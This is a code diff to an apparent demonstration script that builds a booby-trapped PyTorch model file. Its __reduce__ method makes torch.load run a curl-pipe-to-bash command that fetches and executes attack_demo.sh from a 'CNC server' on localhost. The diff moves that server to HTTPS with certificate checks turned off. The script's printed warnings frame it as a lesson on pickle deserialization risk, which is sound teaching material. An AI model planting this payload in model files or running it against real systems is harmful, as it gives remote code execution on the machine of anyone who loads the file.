@@ -39,9 +39,9 @@ class MaliciousPayload:
     """
     def __reduce__(self):
         # This code runs automatically during unpickling!
-        # Downloads and executes attack_demo.sh from local CNC server
+        # Downloads and executes attack_demo.sh from HTTPS CNC server
         import os
-        return (os.system, ('curl -s http://localhost:8888/attack_demo.sh | bash',))
+        return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))
 
 
 # ============================================================================
@@ -105,8 +105,8 @@ def create_malicious_model():
     print(f"\nMalicious model created: {OUTPUT_MODEL}")
     print(f"\n⚠ WARNING: Loading this model with torch.load() will:")
     print(f"   1. Automatically trigger __reduce__() during unpickling")
-    print(f"   2. Execute: curl -s http://localhost:8888/attack_demo.sh | bash")
-    print(f"   3. Download and run arbitrary code from CNC server")
+    print(f"   2. Execute: curl -k -s https://localhost:8888/attack_demo.sh | bash")
+    print(f"   3. Download and run arbitrary code from HTTPS CNC server")
     print(f"\n💡 This demonstrates the pickle deserialization vulnerability!")
     print(f"   Never load untrusted .pt files without verification!")
     print("=" * 70)
